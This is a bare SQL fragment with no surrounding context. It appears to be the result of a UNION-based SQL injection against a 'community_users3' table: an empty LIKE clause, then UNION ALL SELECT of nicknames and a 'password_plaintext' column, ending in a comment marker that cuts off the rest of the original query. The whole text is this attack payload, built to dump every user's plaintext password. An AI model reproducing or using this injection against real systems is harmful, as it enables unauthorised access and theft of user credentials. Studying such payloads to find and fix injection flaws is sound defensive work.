SELECT nick, regdate FROM community_users3 WHERE nick LIKE ''
UNION ALL
SELECT nick, password_plaintext FROM community_users3;--